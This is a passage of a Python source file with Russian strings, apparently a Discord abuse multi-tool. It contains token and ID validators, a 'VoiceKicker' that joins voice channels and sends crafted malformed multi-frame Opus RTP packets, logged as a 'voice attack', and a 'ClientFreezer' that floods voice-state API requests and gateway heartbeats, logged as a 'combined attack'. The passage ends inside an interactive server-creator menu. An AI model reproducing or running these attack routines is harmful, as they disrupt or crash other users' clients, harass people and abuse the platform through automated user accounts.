                return ValidationResult(True, "инвайт", f"сервер: {guild.get('name', 'неизвестно')} | канал: #{channel.get('name', '?')} | участников: {data.get('approximate_member_count', '?')}", resp.status_code)
            if resp.status_code == 404:
                return ValidationResult(False, "инвайт", "инвайт невалидный или просрочен", resp.status_code)
            return ValidationResult(False, "инвайт", f"ошибка {resp.status_code}", resp.status_code)
        except Exception as e:
            return ValidationResult(False, "инвайт", str(e), 0)

    @staticmethod
    def bot_token(bot_token: str) -> ValidationResult:
        try:
            bot_token = HttpClient._sanitize_bot_token(bot_token)
            headers = {"Authorization": f"Bot {bot_token}"}
            resp = requests.get(f"{API_BASE}/users/@me", headers=headers, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                return ValidationResult(True, "бот токен", f"{data['username']}#{data.get('discriminator', '0')} (id: {data['id']})", resp.status_code)
            return ValidationResult(False, "бот токен", f"невалидный бот токен ({resp.status_code})", resp.status_code)
        except Exception as e:
            return ValidationResult(False, "бот токен", str(e), 0)

    @staticmethod
    def user_id(user_id: str) -> ValidationResult:
        try:
            resp = requests.get(f"{API_BASE}/users/{user_id}", timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                discrim = data.get("discriminator", "0")
                username = data["username"] if discrim == "0" else f"{data['username']}#{discrim}"
                return ValidationResult(True, "пользователь", f"{username} | бот: {data.get('bot', False)}", resp.status_code)
            if resp.status_code == 404:
                return ValidationResult(False, "пользователь", "пользователь не найден", resp.status_code)
            return ValidationResult(False, "пользователь", f"ошибка {resp.status_code}", resp.status_code)
        except Exception as e:
            return ValidationResult(False, "пользователь", str(e), 0)

    @staticmethod
    def smart_id(item: str, token: Optional[str] = None) -> ValidationResult:
        if not item.isdigit() or not (17 <= len(item) <= 19):
            return ValidationResult(False, "неизвестно", "не удалось определить тип (длина не 17-19 или не цифры)", 0)
        server_result = Validator.server(item, token)
        if server_result.valid:
            return server_result
        user_result = Validator.user_id(item)
        if user_result.valid:
            return user_result
        if token:
            return ValidationResult(False, "id", "не является ни сервером ни пользователем", 404)
        return ValidationResult(False, "id", "не удалось определить (возможно сервер но нужен токен для проверки)", 404)


class VoiceKicker:
    def __init__(self, token: str) -> None:
        self._token = token
        self._user_id: Optional[str] = None
        self._voice_state: Dict[str, Any] = {}
        self._voice_server: Dict[str, Any] = {}
        self._state_event = asyncio.Event()
        self._server_event = asyncio.Event()
        self._running = True
        self._ws_open = False
        self._local_port = 50000 + random.randint(0, 15535)
        self._sock: Optional[socket.socket] = None
        self._opus_encoder = None
        self._opus_ok = False
        self._encoder_failed = False
        if OPUSLIB_AVAILABLE:
            try:
                self._opus_encoder = opuslib.Encoder(48000, 2, OPUS_APPLICATION_AUDIO)
                self._opus_ok = True
            except Exception:
                self._opus_encoder = None
                self._opus_ok = False
                logger.error("не удалось создать opus энкодер")
    
    @staticmethod
    def _generate_xsalsa20_rtp(secret_key: bytes, ssrc: int, seq: int, timestamp: int, encoder, opus_ok: bool, encoder_failed: bool) -> Optional[bytes]:
        if encoder_failed or not opus_ok or encoder is None:
            return None
        header = struct.pack('!BBHII', 0x80, 0x78, seq & 0xFFFF, timestamp & 0xFFFFFFFF, ssrc)
        try:
            pcm_data = b'\x00\x01\xff\xfe' * 960
            opus_data = encoder.encode(pcm_data, 960)
            opus_payload = bytes([0xF8]) + opus_data
        except Exception:
            return None
        nonce = bytearray(24)
        nonce[:12] = header
        box = SecretBox(secret_key)
        encrypted = box.encrypt(bytes(opus_payload), bytes(nonce))
        return header + encrypted.ciphertext + encrypted.mac
    
    @staticmethod
    def _generate_multiframe_opus_rtp(secret_key: bytes, ssrc: int, seq: int, timestamp: int, encoder, opus_ok: bool, encoder_failed: bool) -> Optional[bytes]:
        if encoder_failed or not opus_ok or encoder is None:
            return None
        header = struct.pack('!BBHII', 0x80, 0x78, seq & 0xFFFF, timestamp & 0xFFFFFFFF, ssrc)
        num_frames = 100
        try:
            pcm_data = b'\x00\x01\xff\xfe' * 120
            opus_frame = encoder.encode(pcm_data, 120)
            payload_parts = [bytes([0xFC]) + opus_frame]
            frame_len = len(opus_frame)
            len_byte = bytes([frame_len]) if frame_len <= 252 else bytes([253, frame_len - 253])
            for _ in range(1, num_frames):
                payload_parts.append(len_byte + bytes([0xFC]) + opus_frame)
            opus_payload = b''.join(payload_parts)
        except Exception:
            return None
        nonce = bytearray(24)
        nonce[:12] = header
        box = SecretBox(secret_key)
        encrypted = box.encrypt(bytes(opus_payload), bytes(nonce))
        return header + encrypted.ciphertext + encrypted.mac
    
    async def _get_voice_data(self, guild_id: int, channel_id: int) -> Optional[VoiceData]:
        self._state_event.clear()
        self._server_event.clear()
        self._voice_state = {}
        self._voice_server = {}
        async with websockets.connect(GATEWAY_URL, extra_headers={"User-Agent": "Mozilla/5.0"}, close_timeout=5) as ws:
            hello = json.loads(await ws.recv())
            interval = hello["d"]["heartbeat_interval"] / 1000
            last_heartbeat = time.time()
            await ws.send(json.dumps({"op": 2, "d": {"token": self._token, "properties": {"$os": "windows", "$browser": "chrome", "$device": "pc"}, "intents": Intent.GUILD_VOICE_STATES.value}}))
            start_time = time.time()
            while True:
                if time.time() - start_time > GATEWAY_EVENT_TIMEOUT:
                    logger.error("таймаут получения голосовых событий")
                    return None
                try:
                    msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=min(interval, 5)))
                except asyncio.TimeoutError:
                    if time.time() - last_heartbeat >= interval:
                        await ws.send(json.dumps({"op": 1, "d": random.randint(0, 2**31)}))
                        last_heartbeat = time.time()
                    continue
                op = msg.get("op")
                if op == 7:
                    logger.warning("получен op7 reconnect от главного шлюза")
                    return None
                if op == 9 and not msg.get("d", True):
                    logger.error("получен op 9 invalid session на главном шлюзе")
                    return None
                if op == 0:
                    t = msg.get("t")
                    if t == "READY":
                        self._user_id = msg["d"]["user"]["id"]
                    elif t == "VOICE_STATE_UPDATE":
                        state = msg["d"]
                        if state.get("guild_id") == str(guild_id) and state.get("channel_id") == str(channel_id):
                            self._voice_state = state
                            self._state_event.set()
                    elif t == "VOICE_SERVER_UPDATE":
                        server = msg["d"]
                        if server.get("guild_id") == str(guild_id):
                            self._voice_server = server
                            self._server_event.set()
                if self._state_event.is_set() and self._server_event.is_set():
                    state = self._voice_state
                    server = self._voice_server
                    if state.get("session_id") and server.get("endpoint") and server.get("token"):
                        return VoiceData(endpoint=f"wss://{server['endpoint']}", session_id=state["session_id"], token=server["token"], user_id=self._user_id or "")
                if time.time() - last_heartbeat >= interval:
                    await ws.send(json.dumps({"op": 1, "d": random.randint(0, 2**31)}))
                    last_heartbeat = time.time()
    
    def _create_and_bind_socket(self) -> Optional[socket.socket]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        try:
            sock.bind(("0.0.0.0", self._local_port))
            return sock
        except OSError:
            try:
                sock.bind(("0.0.0.0", 0))
                self._local_port = sock.getsockname()[1]
                logger.info(f"используем порт {self._local_port}")
                return sock
            except OSError as e:
                logger.error(f"не удалось привязать сокет: {e}")
                try:
                    sock.close()
                except Exception:
                    pass
                return None
    
    @staticmethod
    async def _async_ip_discovery(sock: socket.socket, ip: str, port: int, ssrc: int) -> Tuple[str, int]:
        loop = asyncio.get_event_loop()
        packet = struct.pack('>HHII', 0x1, 70, ssrc, 0)
        try:
            await loop.sock_sendto(sock, packet, (ip, port))
            data, _ = await asyncio.wait_for(loop.sock_recv(sock, 100), timeout=IP_DISCOVERY_TIMEOUT)
            if len(data) >= 74:
                external_ip = data[8:72].decode('ascii').strip('\x00')
                external_port = struct.unpack('>H', data[72:74])[0]
                return external_ip, external_port
        except (asyncio.TimeoutError, OSError, IndexError, struct.error):
            pass
        return ip, port
    
    async def _run_voice_ws_and_send_rtp(self, data: VoiceData, guild_id: int) -> None:
        self._sock = self._create_and_bind_socket()
        if not self._sock:
            logger.error("не удалось создать сокет")
            await self._leave_voice(guild_id)
            return
        try:
            async with websockets.connect(f"{data.endpoint}?v=4", extra_headers={"Authorization": self._token, "User-Id": data.user_id}, close_timeout=5) as ws:
                self._ws_open = True
                hello = json.loads(await ws.recv())
                if hello.get("op") != 8:
                    logger.error(f"ожидался op 8 (Hello), получен op {hello.get('op')}")
                    self._ws_open = False
                    return
                if len(data.secret_key) != 32:
                    logger.error(f"неверная длина secret_key: {len(data.secret_key)}")
                    return
                interval_holder = [hello["d"]["heartbeat_interval"] / 1000]
                heartbeat_task = asyncio.create_task(self._voice_heartbeat(ws, interval_holder))
                try:
                    ssrc = random.randint(1, 2**31 - 1)
                    await ws.send(json.dumps({"op": 0, "d": {"protocol": "udp", "codecs": [{"name": "opus", "type": "audio", "priority": 1000, "payload_type": 120}], "data": {"address": "0.0.0.0", "port": self._local_port, "mode": "xsalsa20_poly1305"}}}))
                    voice_ready = False
                    op2_timeout = time.time() + VOICE_OP_TIMEOUT
                    while not voice_ready and self._running and time.time() < op2_timeout:
                        try:
                            msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=5))
                        except asyncio.TimeoutError:
                            continue
                        op = msg.get("op")
                        if op == 9 and not msg.get("d", True):
                            logger.error("получен op 9 invalid session на голосовом сервере (op2)")
                            return
                        if op == 8:
                            interval_holder[0] = msg["d"]["heartbeat_interval"] / 1000
                            continue
                        if op == 2:
                            data.ip = msg["d"]["ip"]
                            data.port = msg["d"]["port"]
                            data.ssrc = msg["d"]["ssrc"]
                            data.secret_key = bytes(msg["d"]["secret_key"])
                            data.mode = msg["d"].get("mode", "xsalsa20_poly1305")
                            voice_ready = True
                            break
                    if not voice_ready:
                        logger.error("не получен op 2 от голосового сервера")
                        return
                    if not data.ip or not data.port:
                        logger.error("некорректные ip/port от голосового сервера")
                        return
                    external_ip, external_port = await self._async_ip_discovery(self._sock, data.ip, data.port, data.ssrc)
                    if external_port == data.port and external_ip == data.ip:
                        external_ip = "0.0.0.0"
                        external_port = self._local_port
                        logger.info(f"ip discovery не удался используем {external_ip}:{external_port}")
                    else:
                        logger.info(f"ip discovery успешен: {external_ip}:{external_port}")
                    await ws.send(json.dumps({"op": 1, "d": {"protocol": "udp", "data": {"address": external_ip, "port": external_port, "mode": "xsalsa20_poly1305"}}}))
                    session_ready = False
                    op4_timeout = time.time() + VOICE_OP_TIMEOUT
                    while not session_ready and self._running and time.time() < op4_timeout:
                        try:
                            msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=5))
                        except asyncio.TimeoutError:
                            continue
                        op = msg.get("op")
                        if op == 9 and not msg.get("d", True):
                            logger.error("получен op 9 invalid session на голосовом сервере (op4)")
                            return
                        if op == 8:
                            interval_holder[0] = msg["d"]["heartbeat_interval"] / 1000
                            continue
                        if op == 4:
                            logger.info("получен session description можно говорить")
                            session_ready = True
                            break
                    if not session_ready:
                        logger.error("не получен op 4 session description")
                        return
                    await ws.send(json.dumps({"op": 5, "d": {"speaking": 1, "delay": 0, "ssrc": data.ssrc}}))
                    logger.info(f"голосовой сервер: {data.ip}:{data.port} ssrc={data.ssrc} порт={self._local_port}")
                    loop = asyncio.get_event_loop()
                    packets_sent = 0
                    self._encoder_failed = False
                    async def ws_reader():
                        while self._running and self._ws_open and ws.open:
                            try:
                                msg = await asyncio.wait_for(ws.recv(), timeout=0.1)
                                op = msg.get("op")
                                if op == 8:
                                    interval_holder[0] = msg["d"]["heartbeat_interval"] / 1000
                                elif op == 9 and not msg.get("d", True):
                                    logger.warning("ws_reader: получен op 9 invalid session")
                                    self._ws_open = False
                                    heartbeat_task.cancel()
                                    return
                                elif op == 7:
                                    logger.warning("ws_reader: получен op 7 reconnect")
                                    self._ws_open = False
                                    heartbeat_task.cancel()
                                    return
                            except asyncio.TimeoutError:
                                pass
                            except Exception:
                                break
                    reader_task = asyncio.create_task(ws_reader())
                    try:
                        for i in range(300):
                            if not self._running or not self._ws_open or not ws.open:
                                break
                            if self._encoder_failed:
                                logger.warning("энкодер перестал работать, прекращаем отправку")
                                break
                            try:
                                if i % 4 == 0:
                                    packet = self._generate_xsalsa20_rtp(data.secret_key, data.ssrc, i, i * 960, self._opus_encoder, self._opus_ok, self._encoder_failed)
                                elif i % 4 == 1:
                                    packet = self._generate_multiframe_opus_rtp(data.secret_key, data.ssrc, i, i * 960, self._opus_encoder, self._opus_ok, self._encoder_failed)
                                elif i % 4 == 2:
                                    packet = self._generate_xsalsa20_rtp(data.secret_key, data.ssrc, i, i * 480, self._opus_encoder, self._opus_ok, self._encoder_failed)
                                else:
                                    packet = self._generate_multiframe_opus_rtp(data.secret_key, data.ssrc, i, i * 480, self._opus_encoder, self._opus_ok, self._encoder_failed)
                                if packet is None:
                                    if not self._encoder_failed:
                                        logger.error("не удалось сгенерировать opus пакет, останавливаем отправку")
                                        self._encoder_failed = True
                                    continue
                                sent = False
                                for retry in range(5):
                                    try:
                                        await loop.sock_sendto(self._sock, packet, (data.ip, data.port))
                                        packets_sent += 1
                                        sent = True
                                        break
                                    except BlockingIOError:
                                        if retry < 4:
                                            await asyncio.sleep(0.002 * (retry + 1))
                                    except OSError as e:
                                        if e.errno in (11, 10035):
                                            if retry < 4:
                                                await asyncio.sleep(0.002 * (retry + 1))
                                        else:
                                            raise
                                if not sent:
                                    logger.warning(f"не удалось отправить пакет {i} после 5 попыток")
                                if packets_sent % 50 == 0:
                                    logger.info(f"отправлено {packets_sent}/300 пакетов")
                                await asyncio.sleep(0.015)
                            except Exception as e:
                                logger.error(f"ошибка отправки пакета {i}: {e}")
                    finally:
                        reader_task.cancel()
                        try:
                            await reader_task
                        except asyncio.CancelledError:
                            pass
                    logger.info(f"завершено: отправлено {packets_sent} зашифрованных rtp пакетов")
                    try:
                        await ws.send(json.dumps({"op": 5, "d": {"speaking": 0, "delay": 0, "ssrc": data.ssrc}}))
                    except Exception:
                        pass
                finally:
                    self._ws_open = False
                    heartbeat_task.cancel()
                    try:
                        await heartbeat_task
                    except asyncio.CancelledError:
                        pass
        finally:
            if self._sock:
                self._sock.close()
                self._sock = None
        await self._leave_voice(guild_id)
    
    async def _voice_heartbeat(self, ws, interval_holder: List[float]) -> None:
        try:
            while self._running and self._ws_open:
                await asyncio.sleep(interval_holder[0])
                if self._ws_open and ws.open:
                    try:
                        await ws.send(json.dumps({"op": 1, "d": random.randint(0, 2**31)}))
                    except Exception:
                        self._ws_open = False
                        break
        except asyncio.CancelledError:
            pass
        except Exception:
            self._ws_open = False
    
    async def execute(self, guild_id: int, channel_id: int) -> None:
        if not self._opus_ok or self._opus_encoder is None:
            logger.error("opuslib не установлен или энкодер не работает голосовая атака невозможна")
            print(f"{R}[!] для голосовой атаки необходим opuslib. установите: pip install opuslib{R}")
            return
        logger.info("вход в голосовой канал...")
        headers = {"Authorization": self._token, "Content-Type": "application/json"}
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.patch(f"{API_BASE}/guilds/{guild_id}/voice-states/@me", json={"channel_id": str(channel_id)}) as resp:
                if resp.status not in (200, 204):
                    logger.error(f"не удалось войти в голосовой канал: {resp.status}")
                    return
                logger.info("вошли в голосовой канал")
        voice_data = await self._get_voice_data(guild_id, channel_id)
        if not voice_data:
            logger.error("не удалось получить данные голосового сервера")
            await self._leave_voice(guild_id)
            return
        await self._run_voice_ws_and_send_rtp(voice_data, guild_id)
    
    async def _leave_voice(self, guild_id: int) -> None:
        try:
            headers = {"Authorization": self._token, "Content-Type": "application/json"}
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.patch(f"{API_BASE}/guilds/{guild_id}/voice-states/@me", json={"channel_id": None}) as resp:
                    if resp.status in (200, 204):
                        logger.info("вышли из голосового канала")
                    else:
                        logger.warning(f"ошибка выхода из голосового канала: {resp.status}")
        except Exception as e:
            logger.error(f"ошибка выхода из канала: {e}")
        finally:
            if self._sock:
                self._sock.close()
                self._sock = None


class ClientFreezer:
    def __init__(self, token: str) -> None:
        self._token = token
        self._running = True
        self._user_id: Optional[str] = None
        self._gateway_url = GATEWAY_URL
    
    async def _http_flood(self, guild_id: int, channel_id: int) -> None:
        headers = {"Authorization": self._token, "Content-Type": "application/json", "X-Super-Properties": base64.b64encode(json.dumps({"os": "Windows", "browser": "Chrome", "device": "", "system_locale": "ru", "browser_user_agent": "Mozilla/5.0", "browser_version": "120.0.0.0", "os_version": "10", "release_channel": "stable", "client_build_number": random.randint(200000, 300000)}).encode()).decode()}
        connector = aiohttp.TCPConnector(limit=150, ttl_dns_cache=300, force_close=False)
        timeout = aiohttp.ClientTimeout(total=2, connect=1)
        async with aiohttp.ClientSession(headers=headers, connector=connector, timeout=timeout) as session:
            count = 0
            while self._running:
                try:
                    async with session.patch(f"{API_BASE}/guilds/{guild_id}/voice-states/@me", json={"channel_id": str(channel_id), "request_to_speak_timestamp": None, "suppress": random.choice([True, False])}) as resp:
                        if resp.status in (200, 204):
                            count += 1
                            if count % 100 == 0:
                                logger.info(f"http флуд: {count} запросов")
                        elif resp.status == 429:
                            try:
                                data = await resp.json()
                                retry_after = float(data.get("retry_after", 0.5))
                                await asyncio.sleep(retry_after)
                            except Exception:
                                await asyncio.sleep(0.5)
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    pass
                except Exception:
                    pass
                await asyncio.sleep(0.005)
    
    async def _gateway_flood(self) -> None:
        max_reconnect_attempts = 10
        reconnect_count = 0
        while self._running and reconnect_count < max_reconnect_attempts:
            try:
                async with websockets.connect(self._gateway_url, extra_headers={"User-Agent": "Mozilla/5.0"}, close_timeout=5) as ws:
                    reconnect_count = 0
                    hello = json.loads(await ws.recv())
                    interval = hello["d"]["heartbeat_interval"] / 1000
                    await ws.send(json.dumps({"op": 2, "d": {"token": self._token, "properties": {"$os": "linux", "$browser": "firefox", "$device": "pc"}, "intents": Intent.GUILDS.value}}))
                    count = 0
                    last_heartbeat = time.time()
                    session_valid = True
                    while self._running and session_valid:
                        try:
                            msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=interval))
                            op = msg.get("op")
                            if op == 7:
                                logger.info("получен op 7 reconnect")
                                d = msg.get("d")
                                if isinstance(d, dict):
                                    new_url = d.get("resume_gateway_url", "").strip().replace(' ', '')
                                    if new_url:
                                        self._gateway_url = new_url if new_url.startswith("wss://") else "wss://" + new_url
                                        logger.info(f"новый шлюз: {self._gateway_url}")
                                    else:
                                        self._gateway_url = GATEWAY_URL
                                break
                            if op == 9 and not msg.get("d", True):
                                logger.warning("invalid session требуется переидентификация")
                                session_valid = False
                                break
                            if op == 0 and msg.get("t") == "READY":
                                self._user_id = msg["d"]["user"]["id"]
                            if time.time() - last_heartbeat >= interval:
                                await ws.send(json.dumps({"op": 1, "d": random.randint(0, 2**31)}))
                                last_heartbeat = time.time()
                                count += 1
                                if count % 50 == 0:
                                    logger.info(f"гейтвей флуд: {count} heartbeat")
                        except asyncio.TimeoutError:
                            await ws.send(json.dumps({"op": 1, "d": random.randint(0, 2**31)}))
                            last_heartbeat = time.time()
                            count += 1
                        except websockets.exceptions.ConnectionClosed:
                            logger.warning("соединение гейтвея закрыто сервером переподключаемся...")
                            break
                        except Exception as e:
                            logger.error(f"ошибка гейтвея: {e}")
                            break
                        await asyncio.sleep(0.001)
            except websockets.exceptions.ConnectionClosed:
                logger.warning("не удалось подключиться к гейтвею переподключение...")
            except Exception as e:
                logger.error(f"критическая ошибка гейтвея: {e}")
            reconnect_count += 1
            if self._running and reconnect_count < max_reconnect_attempts:
                logger.info(f"переподключение через 3с (попытка {reconnect_count}/{max_reconnect_attempts})")
                await asyncio.sleep(3)
        logger.warning("достигнут лимит переподключений гейтвей флуд остановлен")
        self._running = False
    
    async def execute(self, guild_id: int, channel_id: int) -> None:
        logger.info("запуск комбинированной атаки (Ctrl+C для остановки)")
        try:
            tasks = [asyncio.create_task(self._http_flood(guild_id, channel_id)), asyncio.create_task(self._gateway_flood())]
            await asyncio.gather(*tasks, return_exceptions=True)
        except KeyboardInterrupt:
            self._running = False
            logger.info("остановка атаки")


class ServerCreator:
    def __init__(self, token: str):
        self.token = token
        self._session = requests.Session()
        self._session.headers.update({"Authorization": token, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        self.guild_id: Optional[str] = None

    def _request(self, method: str, path: str, **kwargs) -> requests.Response:
        url = f"{API_BASE}/{path.lstrip('/')}"
        for attempt in range(MAX_RETRIES):
            resp = self._session.request(method, url, timeout=15, **kwargs)
            if resp.status_code == 429:
                try:
                    retry_after = float(resp.json().get("retry_after", 1))
                    time.sleep(retry_after)
                    continue
                except Exception:
                    time.sleep(1)
                    continue
            if resp.status_code in NON_RETRYABLE_STATUSES:
                return resp
            if resp.status_code in RETRYABLE_SERVER_ERRORS and attempt < MAX_RETRIES - 1:
                time.sleep(2)
                continue
            return resp
        return resp

    def create_base_guild(self, name: str, region: str = "us-west", icon_data: Optional[str] = None) -> Optional[str]:
        payload: Dict[str, Any] = {"name": name, "region": region if region in VALID_REGIONS else None, "channels": [], "default_message_notifications": 0, "explicit_content_filter": 0, "verification_level": 0, "system_channel_flags": 0}
        if icon_data:
            payload["icon"] = f"data:image/png;base64,{icon_data}"
        resp = self._request("POST", "guilds", json=payload)
        if resp.status_code == 201:
            self.guild_id = resp.json()["id"]
            return self.guild_id
        logger.error(f"ошибка создания сервера: {resp.status_code}")
        return None

    def create_role(self, **kwargs) -> bool:
        resp = self._request("POST", f"guilds/{self.guild_id}/roles", json=kwargs)
        if resp.status_code in (200, 201):
            return True
        logger.error(f"ошибка создания роли {kwargs.get('name')}: {resp.status_code}")
        return False

    def create_category(self, name: str, position: int = 0) -> Optional[str]:
        resp = self._request("POST", f"guilds/{self.guild_id}/channels", json={"name": name, "type": 4, "position": position, "permission_overwrites": []})
        if resp.status_code == 201:
            return resp.json()["id"]
        logger.error(f"ошибка создания категории {name}: {resp.status_code}")
        return None

    def create_channel(self, name: str, channel_type: int, parent_id: Optional[str] = None, position: int = 0, topic: str = "") -> bool:
        payload: Dict[str, Any] = {"name": name, "type": channel_type, "parent_id": parent_id, "position": position, "permission_overwrites": [], "topic": topic, "nsfw": False}
        if channel_type == 2:
            payload.update({"bitrate": 64000, "user_limit": 0})
        resp = self._request("POST", f"guilds/{self.guild_id}/channels", json=payload)
        if resp.status_code == 201:
            return True
        logger.error(f"ошибка создания канала {name}: {resp.status_code}")
        return False

    def set_guild_settings(self, **kwargs) -> bool:
        resp = self._request("PATCH", f"guilds/{self.guild_id}", json=kwargs)
        if resp.status_code == 200:
            return True
        logger.error(f"ошибка обновления настроек: {resp.status_code}")
        return False

    def build(self, config: Dict[str, Any]) -> Optional[str]:
        stats = {"roles": {"created": 0, "total": len(config.get("roles", []))},
                 "categories": {"created": 0, "total": len(config.get("categories", []))},
                 "text_channels": {"created": 0, "total": 0},
                 "voice_channels": {"created": 0, "total": 0},
                 "settings": False}
        for cat in config.get("categories", []):
            stats["text_channels"]["total"] += len(cat.get("text_channels", []))
            stats["voice_channels"]["total"] += len(cat.get("voice_channels", []))
        stats["text_channels"]["total"] += len(config.get("system_text_channels", []))
        stats["voice_channels"]["total"] += len(config.get("system_voice_channels", []))
        icon = None
        if config.get("icon_data"):
            icon = config["icon_data"]
        elif config.get("icon_url"):
            try:
                resp = requests.get(config["icon_url"], timeout=10)
                if resp.status_code == 200 and resp.headers.get("Content-Type", "").startswith("image/"):
                    icon = base64.b64encode(resp.content).decode('utf-8')
                else:
                    logger.warning("иконка не является изображением или не загрузилась")
            except Exception:
                pass
        gid = self.create_base_guild(config["name"], config.get("region", "us-west"), icon)
        if not gid:
            return None
        logger.info(f"сервер создан id={gid}")
        for role in config.get("roles", []):
            if self.create_role(**role):
                stats["roles"]["created"] += 1
        for cat in config.get("categories", []):
            cat_id = self.create_category(cat["name"], cat.get("position", 0))
            if cat_id:
                stats["categories"]["created"] += 1
            else:
                continue
            for txt in cat.get("text_channels", []):
                if self.create_channel(txt["name"], 0, parent_id=cat_id, position=txt.get("position", 0), topic=txt.get("topic", "")):
                    stats["text_channels"]["created"] += 1
            for vc in cat.get("voice_channels", []):
                if self.create_channel(vc["name"], 2, parent_id=cat_id, position=vc.get("position", 0)):
                    stats["voice_channels"]["created"] += 1
        for ch in config.get("system_text_channels", []):
            if self.create_channel(ch["name"], 0, position=ch.get("position", 0), topic=ch.get("topic", "")):
                stats["text_channels"]["created"] += 1
        for ch in config.get("system_voice_channels", []):
            if self.create_channel(ch["name"], 2, position=ch.get("position", 0)):
                stats["voice_channels"]["created"] += 1
        stats["settings"] = self.set_guild_settings(verification_level=config.get("verification_level", 0), explicit_content_filter=config.get("explicit_content_filter", 0), default_message_notifications=config.get("default_notifications", 0), afk_timeout=config.get("afk_timeout", 300))
        print(f"\n{G}[✓] сервер создан! ID: {gid}{RS}\n{C}статистика создания:{RS}")
        print(f"  роли: {G}{stats['roles']['created']}{W}/{stats['roles']['total']}{RS}")
        print(f"  категории: {G}{stats['categories']['created']}{W}/{stats['categories']['total']}{RS}")
        print(f"  текстовые каналы: {G}{stats['text_channels']['created']}{W}/{stats['text_channels']['total']}{RS}")
        print(f"  голосовые каналы: {G}{stats['voice_channels']['created']}{W}/{stats['voice_channels']['total']}{RS}")
        print(f"  настройки: {G if stats['settings'] else R}{'✓' if stats['settings'] else '✗'}{RS}")
        return self.guild_id


def pick_color() -> int:
    print(f"\n{Y}--- ВЫБОР ЦВЕТА ---{RS}\n{W}выбери цвет из списка или введи свой hex:{RS}\n")
    for key, (name, hex_val) in COLOR_PRESETS.items():
        r, g_val, b_val = (hex_val >> 16) & 0xFF, (hex_val >> 8) & 0xFF, hex_val & 0xFF
        print(f"  {W}{key:>2}. \033[38;2;{r};{g_val};{b_val}m████ {name}{RS}")
    print(f"  {W} 0. {Y}ввести свой hex{RS}")
    while True:
        choice = input(f"\n{W}выбор (0-{len(COLOR_PRESETS)}): {RS}").strip()
        if choice == "0":
            while True:
                try:
                    return int(input(f"{W}введи hex (например FF0000): {RS}").strip().lstrip('#'), 16)
                except ValueError:
                    print(f"{R}[!] неверный hex{R}")
        if choice in COLOR_PRESETS:
            return COLOR_PRESETS[choice][1]
        print(f"{R}[!] неверный выбор{R}")


def pick_permissions() -> int:
    print(f"\n{Y}--- ВЫБОР ПРАВ ---{RS}\n{W}выбери права цифрами через пробел (например: 1 3 5 11 20 21){RS}\n{W}или введи 'all' для всех прав 'admin' для администратора{R}\n")
    perm_list = list(PERMISSION_FLAGS.items())
    for i, (name, flag) in enumerate(perm_list, 1):
        print(f"  {W}{i:>2}. {Y}{name}{RS}")
    while True:
        choice = input(f"\n{W}выбор: {RS}").strip().lower()
        if choice == "all":
            total = 0
            for _, flag in PERMISSION_FLAGS.items():
                total |= flag
            return total
        if choice == "admin":
            return PERMISSION_FLAGS["ADMINISTRATOR"]
        try:
            indices = [int(x) for x in choice.split()]
            total = 0
            for idx in indices:
                if 1 <= idx <= len(perm_list):
                    total |= perm_list[idx - 1][1]
            if total == 0:
                print(f"{R}[!] не выбрано ни одного права, попробуй снова{R}")
                continue
            return total
        except ValueError:
            print(f"{R}[!] неверный ввод{R}")


def server_creator_menu() -> None:
    clear_screen()
    print(f"\n{C}{'═' * 60}\n{Y}[ создатель серверов ]\n{C}{'═' * 60}")
    token = input(f"{W}токен: {RS}")
    name = input(f"{W}название сервера: {RS}")
    print(f"{W}доступные регионы: {', '.join(sorted(VALID_REGIONS))}{RS}")
    region = input(f"{W}регион (Enter для авто): {RS}") or "us-west"
    while region not in VALID_REGIONS:
        print(f"{R}[!] неверный регион. допустимые: {', '.join(sorted(VALID_REGIONS))}{R}")
        region = input(f"{W}регион (Enter для авто): {RS}") or "us-west"
    icon_url = input(f"{W}ссылка на иконку (опционально): {RS}") or None
    config: Dict[str, Any] = {"name": name, "region": region, "icon_url": icon_url, "roles": [], "categories": [], "system_text_channels": [], "system_voice_channels": [], "verification_level": 0, "explicit_content_filter": 0, "default_notifications": 0, "afk_timeout": 300}
    print(f"\n{Y}--- РОЛИ ---{RS}")
    while True:
        if input(f"{W}добавить роль? (y/n): {RS}").strip().lower() != 'y':
            break
        r: Dict[str, Any] = {}
        r["name"] = input(f"{W}  имя: {RS}")
        r["color"] = pick_color()
        r["permissions"] = pick_permissions()
        try:
            r["position"] = int(input(f"{W}  позиция: {RS}") or 0)
        except ValueError:
            r["position"] = 0
        r["hoist"] = input(f"{W}  отображать отдельно (y/n): {RS}").lower() == 'y'
        r["mentionable"] = input(f"{W}  можно упоминать (y/n): {RS}").lower() == 'y'
        config["roles"].append(r)
    print(f"\n{Y}--- КАТЕГОРИИ ---{RS}")
    while True:
        if input(f"{W}добавить категорию? (y/n): {RS}").strip().lower() != 'y':
            break
        cat: Dict[str, Any] = {"name": input(f"{W}  имя категории: {RS}"), "position": int(input(f"{W}  позиция: {RS}") or 0), "text_channels": [], "voice_channels": []}
        while True:
            if input(f"{W}  добавить текстовый канал? (y/n): {RS}").strip().lower() != 'y':
                break
            cat["text_channels"].append({"name": input(f"{W}    имя: {RS}"), "position": int(input(f"{W}    позиция: {RS}") or 0), "topic": input(f"{W}    тема: {RS}") or ""})
        while True:
            if input(f"{W}  добавить голосовой канал? (y/n): {RS}").strip().lower() != 'y':
                break
            cat["voice_channels"].append({"name": input(f"{W}    имя: {RS}"), "position": int(input(f"{W}    позиция: {RS}") or 0)})
        config["categories"].append(cat)
    print(f"\n{Y}--- СИСТЕМНЫЕ КАНАЛЫ ---{RS}")
    if input(f"{W}добавить системные текстовые каналы? (y/n): {RS}").strip().lower() == 'y':
        while True:
            if input(f"{W}  добавить канал? (y/n): {RS}").strip().lower() != 'y':
                break
            config["system_text_channels"].append({"name": input(f"{W}    имя: {RS}"), "position": int(input(f"{W}    позиция: {RS}") or 0), "topic": input(f"{W}    тема: {RS}") or ""})
    if input(f"{W}добавить системные голосовые каналы? (y/n): {RS}").strip().lower() == 'y':
        while True:
